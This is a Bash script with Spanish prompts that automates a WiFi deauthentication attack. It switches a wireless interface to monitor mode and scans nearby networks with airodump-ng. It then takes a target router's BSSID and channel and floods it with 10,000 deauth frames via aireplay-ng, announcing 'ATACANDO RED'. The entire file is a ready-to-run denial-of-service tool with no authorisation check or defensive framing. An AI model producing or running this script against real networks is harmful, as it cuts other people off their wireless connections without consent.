#!/bin/bash

# Colores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Encabezado
clear
echo -e "${GREEN}=============================================="
echo -e "=== Script de Desconexión WiFi (Deauth) ==="
echo -e "==============================================${NC}"
echo ""

# Paso 1: Mostrar interfaces WiFi disponibles
echo -e "${YELLOW}[+] Detectando interfaces WiFi disponibles...${NC}"
echo -e "${BLUE}$(iw dev | grep Interface | awk '{print $2}')${NC}"
echo ""
read -p "[?] Ingresa el nombre de la interfaz (ej. wlan1): " IFACE

# Paso 2: Activar modo monitor
echo -e "\n${YELLOW}[+] Configurando interfaz ${BLUE}$IFACE${YELLOW} en modo monitor...${NC}"
sudo ip link set $IFACE down 2>/dev/null
sudo iw dev $IFACE set type monitor 2>/dev/null
sudo ip link set $IFACE up 2>/dev/null

if [ $? -eq 0 ]; then
    echo -e "${GREEN}[✓] Modo monitor activado correctamente en ${BLUE}$IFACE${NC}"
else
    echo -e "${RED}[X] Error al configurar modo monitor${NC}"
    exit 1
fi

# Paso 3: Escanear redes WiFi
echo -e "\n${YELLOW}[+] Escaneando redes WiFi... ${NC}"
echo -e "${YELLOW}[!] Presiona ${RED}Ctrl+C${YELLOW} cuando veas la red objetivo${NC}\n"
sleep 3
sudo airodump-ng $IFACE

# Paso 4: Pedir datos de la red objetivo
echo -e "\n${YELLOW}[+] Ingresa los datos de la red objetivo:${NC}"
read -p "[?] BSSID del router: " BSSID
read -p "[?] Canal (CH) del router: " CHANNEL

# Paso 5: Fijar canal de la interfaz
echo -e "\n${YELLOW}[+] Configurando interfaz en canal ${BLUE}$CHANNEL${YELLOW}...${NC}"
sudo iwconfig $IFACE channel $CHANNEL 2>/dev/null

# Paso 6: Ataque de deautenticación
echo -e "\n${RED}[!] INICIANDO ATAQUE DE DEAUTENTICACIÓN${NC}"
echo -e "${YELLOW}[!] Para detener el ataque presiona ${RED}Ctrl+C${NC}\n"
sleep 2

echo -e "${RED}=============================================="
echo -e "=== ATACANDO RED: ${BSSID} ==="
echo -e "==============================================${NC}\n"

sudo aireplay-ng --deauth 10000 -a $BSSID $IFACE

# Limpieza al salir
echo -e "\n${YELLOW}[+] Restaurando interfaz a modo managed...${NC}"
sudo ip link set $IFACE down 2>/dev/null
sudo iw dev $IFACE set type managed 2>/dev/null
sudo ip link set $IFACE up 2>/dev/null

echo -e "${GREEN}[✓] Script finalizado. Interfaz restaurada.${NC}"